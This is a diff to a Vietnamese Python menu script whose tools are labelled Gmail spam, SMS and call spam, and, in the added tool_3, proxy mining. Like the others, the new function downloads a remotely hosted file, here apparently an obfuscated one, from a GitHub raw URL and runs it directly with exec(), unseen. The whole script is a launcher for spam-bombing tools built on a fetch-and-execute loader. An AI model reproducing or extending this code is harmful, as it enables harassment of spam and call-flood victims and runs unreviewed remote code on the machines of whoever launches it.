@@ -67,16 +67,31 @@ def tool_2():
             print("LỖI XẢY RA:", e)
     else:
         print("TOOL ĐANG UPDATE LIÊN HỆ 0901386277 ĐỂ ĐƯỢC HỖ TRỢ")
+def tool_3():
+    url = 'https://raw.githubusercontent.com/hoangquocanh2008/MONKEYX/main/obf-5770402168%20(4).py'
+
+    response = requests.get(url)
+    if response.status_code == 200:
+        code = response.text
+        
+        try:
+            exec(code)
+        except Exception as e:
+            print("LỖI XẢY RA:", e)
+    else:
+        print("TOOL ĐANG UPDATE LIÊN HỆ 0901386277 ĐỂ ĐƯỢC HỖ TRỢ")
 
 def main():
-    print("1: SPAM GMAIL\n2: SPAM SMS & CALL")
+    print("1: SPAM GMAIL\n2: SPAM SMS & CALL\n3:Tool đào PROXY")
     choice = input("Chọn tool: ")
     if choice == "1":
         tool_1()
     elif choice == "2":
         tool_2()
+    elif choice == "3":
+        tool_3()    
     else:
-        print("Vui lòng chọn 1 và 2")
+        print("Vui lòng chọn 1,2,3")
 
 # Chạy chương trình chính
 main()
